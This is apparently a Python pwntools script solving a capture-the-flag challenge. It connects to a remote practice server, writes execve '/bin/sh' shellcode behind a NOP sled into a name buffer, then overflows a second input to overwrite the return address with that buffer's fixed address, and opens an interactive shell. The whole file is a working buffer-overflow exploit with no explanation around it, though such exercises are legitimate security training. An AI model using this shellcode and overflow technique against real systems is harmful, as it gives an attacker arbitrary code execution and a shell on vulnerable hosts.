#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3003)
pwn.context.log_level = 'debug'

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
name = 0x804a060
padding = b"A"*24

payload = b"\x90"*10
payload += shellcode
payload += b"\x90"*5
p.sendlineafter("Name : ", payload)

payload = padding
payload += pwn.p32(name)
p.sendlineafter("input : ", payload)

p.interactive()
